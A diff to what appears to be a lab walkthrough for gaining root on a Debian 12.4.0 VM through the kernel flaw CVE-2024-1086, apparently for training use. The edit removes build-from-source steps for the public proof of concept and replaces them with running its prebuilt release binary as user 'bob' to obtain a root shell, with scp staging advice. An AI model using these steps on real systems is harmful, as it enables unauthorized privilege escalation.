@@ -253,22 +253,18 @@ The target is Debian **12.4.0**, whose kernel is vulnerable to **CVE-2024-1086**
 
 - https://github.com/Notselwyn/CVE-2024-1086
 
-High level (follow the PoC's own README for specifics):
+You don't need to compile it — Notselwyn publishes prebuilt exploit binaries on the project's **Releases** page:
 
-```bash
-# as bob, on the target
-git clone https://github.com/Notselwyn/CVE-2024-1086
-cd CVE-2024-1086
-make
-./exploit        # drops you to a root shell on a vulnerable kernel
-```
+- https://github.com/Notselwyn/CVE-2024-1086/releases
+
+Grab the matching release binary and run it on the target as `bob`, following the project's own README. On a vulnerable kernel it returns a root shell:
 
 ```bash
 whoami
 # root
 ```
 
-> If you need to stage the exploit without internet on the VM, build it on Kali and copy it over with `scp`.
+> If the target has no internet, download the release binary on Kali and copy it over with `scp`.
 
 > ⚠️ Kernel exploits are inherently unstable. On rare occasions the PoC can crash or hang the VM. If that happens, reset and start over — `vagrant reload debian_vm` (or `vagrant destroy debian_vm && vagrant up debian_vm` for a clean slate).
 
